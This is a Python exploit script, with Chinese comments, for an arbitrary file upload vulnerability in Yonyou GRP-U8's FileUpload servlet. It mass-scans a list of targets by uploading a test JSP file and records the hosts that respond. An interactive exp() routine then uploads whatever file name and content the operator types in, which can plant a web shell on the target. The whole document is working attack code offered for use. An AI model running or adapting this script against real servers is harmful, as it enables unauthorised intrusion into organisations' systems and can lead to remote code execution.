# 用友GRP-U8 FileUpload 文件上传漏洞
# 利用只能使用-u进行
# 查看回显文件
# http://x.x.x.x/R9iPortal/upload/ccsxxzjx.jsp
import requests
import argparse
import sys
import time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="用友GRP-U8 FileUpload 文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/servlet/FileUpload?fileName=ccsxxzjx.jsp&actionID=update'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Connection": "close",
    }
    data = "123456"# 修改为正确的文件参数格式
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        response = requests.post(url=target+payload, headers=headers, data=data, proxies=proxies, verify=False)
        # print(response.status_code)
        if response.status_code == 200:
            print(f"[+]该网址存在任意文件上传漏洞{target}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-]该网址不存在任意文件上传漏洞{target}")
    except requests.RequestException as e:
        print(f"[*]该网址存在问题，请手动检测{target}")

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        file = input('请输入你要上传的文件名,q退出>')
        if file == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Connection": "close",
        }
        payload = f'/servlet/FileUpload?fileName={file}&actionID=update'            
        data = input("请输入你要上传的内容")
        res = requests.post(url=target+payload, headers=headers, data=data)

if __name__ =='__main__':
    main()